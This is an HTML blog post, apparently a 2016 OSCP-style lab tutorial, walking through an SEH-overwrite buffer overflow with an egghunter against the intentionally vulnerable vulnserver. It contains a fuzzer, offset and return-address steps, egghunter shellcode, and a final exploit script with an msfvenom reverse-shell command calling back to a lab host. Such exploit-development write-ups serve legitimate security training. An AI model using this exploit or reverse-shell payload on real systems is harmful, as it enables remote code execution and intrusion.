@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>
+    
+      Can I have some EGGs with my SEH? &middot; T0w3ntum
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png">
+</head>
+
+
+  <body>
+    <nav class="nav">
+      <div class="nav-container">
+        <a href="/">
+          <h2 class="nav-title">T0w3ntum</h2>
+        </a>
+        <ul>
+          <li><a href="/about">About</a></li>
+          <li><a href="/">Posts</a></li>
+        </ul>
+    </div>
+  </nav>
+
+    <main>
+      <div class="post">
+  <div class="post-info">
+    <span>Written by</span>
+    
+        T0w3ntum
+    
+
+    
+      <br>
+      <span>on&nbsp;</span><time datetime="2016-08-05 00:00:00 -0500">August 05, 2016</time>
+    
+  </div>
+
+  <h1 class="post-title">Can I have some EGGs with my SEH?</h1>
+  <div class="post-line"></div>
+
+  <p>I was really craving some SEH today, but someone mentioned EGG’s and I was like…what the hell, why not. So, going off
+vulnserver like we did last time, let’s build an exploit against SEH and make like the Easter Bunny and drop some eggs in there
+as well.</p>
+
+<h2 id="fuzzing">Fuzzing!</h2>
+
+<p>Like before, we need to fuzz the application to find out where we crash it. As I already knew that the GMON function was
+vulnerable I whipped up a quick fuzzer.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+
+<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span><span class="n">socket</span>
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">count</span> <span class="o">=</span> <span class="mi">100</span>
+<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">100</span><span class="p">:</span>
+  <span class="n">buf</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">"A"</span> <span class="o">*</span> <span class="n">count</span><span class="p">)</span>
+  <span class="n">count</span> <span class="o">=</span> <span class="n">count</span> <span class="o">+</span> <span class="mi">100</span>
+
+<span class="k">for</span> <span class="n">string</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+  <span class="n">connect</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'192.168.1.41'</span><span class="p">,</span><span class="mi">6666</span><span class="p">))</span>
+  <span class="k">print</span> <span class="s">'[+] Fuzzing GMON / with </span><span class="si">%</span><span class="s">s bytes'</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">))</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'GMON / '</span> <span class="o">+</span> <span class="n">string</span><span class="p">)</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>After kicking it off, we can see that the application crashes at around 4000 bytes of A’s. You can also see that we overwrite the
+SEH pointer and handler. You can see this in the stack, usually the SEH chains are near the bottom of the stack so just scroll on
+down in immunity and you should see something similar to the image below.</p>
+
+<p><img src="/images/seh_egg/crash-at-4000.png" alt="Crash" /></p>
+
+<p><img src="/images/seh_egg/stack-seh-pointers.png" alt="Overwrite SEH" /></p>
+
+<p>Why is overwriting the SEH handler important? Well, read this <a href="https://www.exploit-db.com/docs/17505.pdf">excellent paper</a> over
+at Exploit-db for some more information. All you need to know for this write-up is that it’s important, and it’s fun!</p>
+
+<h2 id="finding-the-offset">Finding the Offset!</h2>
+
+<p>Now that we know we can crash the application around 4000 bytes, let’s find the exact offset where we overwrite the EIP. As
+usual, we’ll use Metasploit pattern_create and pattern_offset for this task.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb 4000
+</code></pre></div></div>
+
+<p>And then we’ll update our code with the new patter.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+
+<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span><span class="n">socket</span>
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="s">'Place your generated string here'</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">connect</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'192.168.1.41'</span><span class="p">,</span><span class="mi">6666</span><span class="p">))</span>
+<span class="k">print</span> <span class="s">'[+] Fuzzing GMON / with </span><span class="si">%</span><span class="s">s bytes'</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'GMON / '</span> <span class="o">+</span> <span class="n">buf</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Go ahead and restart vulnserver with CTRL+F2 and then execute the new script. You’ll have to pass the exception with ALT+F9.
+After you do this, you’ll see we have overwritten EIP with a new value. Send that value into pattern_offset to find the correct
+offset.</p>
+
+<p><img src="/images/seh_egg/offset.png" alt="Offset" /></p>
+
+<p><img src="/images/seh_egg/pattern_offset1.png" alt="Offset" /></p>
+
+<p>Note the offset, yours may differ but mine was 3521. Now remember, we want to overwrite the SE Handler so I’m going to subtract 4
+from the offset. If we didn’t, we would get something like this.</p>
+
+<p><img src="/images/seh_egg/wrong.png" alt="Wrong overwrite" /></p>
+
+<p>When we subtract 4 from the offset and verify it, we can now see we properly overwrite the SE Handler.</p>
+
+<p><img src="/images/seh_egg/overwriting_pointer.png" alt="Correct overwrite" /></p>
+
+<h2 id="finding-our-return">Finding our Return</h2>
+
+<p>Unlike the last buffer overflow, we aren’t going to look for a JMP ESP this time. Instead, we want to find a POP POP RET call.
+This will bring us back to the stack and execute our next SEH. Because we also control that record, we can change the pointer to
+something new. So our buffer looks something like this.</p>
+
+<p>[String of NOPS] [Pointer to next SEH] [SE Handler] [Random Data]</p>
+
+<p>So to find our return, we need to find some instruction calls that do pop pop ret. First, let’s look at our modules and make sure
+we can find one without SEH protections enabled.</p>
+
+<p><img src="/images/seh_egg/safeseh-false.png" alt="Mona Modules" /></p>
+
+<p>Looks like we can once again use essfunc.dll. So lets go find what we need. In immunity, bring up the executable modules with
+ALT+E and double click the essfunc.dll module. In the assembly window hit CTRL+S and enter the sequence. Check the image below
+for reference.</p>
+
+<p><img src="/images/seh_egg/search-pop-pop-retn.png" alt="Searching" /></p>
+
+<p>As you can see, we have a perfect candidate. Let’s take note of this address.</p>
+
+<p><img src="/images/seh_egg/pop-pop-retn.png" alt="Found Return" /></p>
+
+<h2 id="squeezing-in-the-shellcode">Squeezing in the shellcode!</h2>
+
+<p>Now one problem we have is that after our buffer, we don’t have much room for our shellcode. It’s only something like 52 bytes
+before the end of the stack. We have a few options, but this is where I wanted to toss our EGG in.</p>
+
+<p><img src="/images/seh_egg/control-no-room.png" alt="No room." /></p>
+
+<p>So, after we POP POP RET and hit the next SEH, we can continue the flow of the application. What we want to do is JMP over our SE
+Handler into our ‘First Stage’ payload. This is where we’ll put the egghunter. So we’ll use JMP SHORT to jump over the SE
+Handler. \xEB\x06\x90\x90 or jmp short 0x8 nop nop.</p>
+
+<p>Pro tip: you can verify this with the following.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python -c 'print "\xEB\x06\x90\x90"' &gt; jmp
+# ndisasm -b 32 jmp
+00000000  EB06              jmp short 0x8
+00000002  90                nop
+00000003  90                nop
+</code></pre></div></div>
+
+<p>So now our buffer looks like this.</p>
+
+<p>[NOP][PAYLOAD][JMP SHORT 0x8][POP POP RET][EGGHUNTER]</p>
+
+<p>So what will we use for an egghunter? I went out to
+<a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/">corelan</a> and grabbed the
+NTAccessCheck shellcode. Please go see the
+article. Very helpful</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+</code></pre></div></div>
+
+<p>So our new and improved code looks like this.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+
+<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span><span class="n">socket</span>
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">3517</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;L'</span><span class="p">,</span> <span class="mh">0x625010B4</span><span class="p">)</span>    <span class="c"># POP EBX, POP EBP, RET</span>
+<span class="n">egg</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x54\x30\x30\x57</span><span class="s">"</span>        <span class="c"># W00T</span>
+
+<span class="c"># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.37 LPORT=443 -e x86/shikata_ga_nai -v shellcode -f python -b "\x00"</span>
+<span class="n">shellcode</span> <span class="o">=</span>  <span class="s">""</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+<span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">egg</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">egg</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xEB\x06\x90\x90</span><span class="s">"</span>       <span class="c"># JMP SHORT 0x8, NOP NOP</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">ret</span>
+<span class="n">buf</span> <span class="o">+=</span>
+<span class="s">"</span><span class="se">\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7</span><span class="s">"</span>       
+<span class="c"># Egghunter</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mi">4000</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">connect</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'192.168.1.41'</span><span class="p">,</span><span class="mi">6666</span><span class="p">))</span>
+<span class="k">print</span> <span class="s">'[+] Fuzzing GMON / with </span><span class="si">%</span><span class="s">s bytes'</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'GMON / '</span> <span class="o">+</span> <span class="n">buf</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>And that should do it. Your spiffy new overflow is ready to go. Generate your payload, update the script, and fire it off.</p>
+
+
+</div>
+
+<div class="pagination">
+  
+    <a href="/2016-08-07/i-fought-the-oscp" class="left arrow">&#8592;</a>
+  
+  
+    <a href="/2016-08-05/Buffer-overflows-and-you" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+
+    </main>
+
+    <footer>
+      <span>
+        &copy; <time datetime="2018-02-24 19:06:05 -0600">2018</time> . Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+      </span>
+    </footer>
+  </body>
+</html>
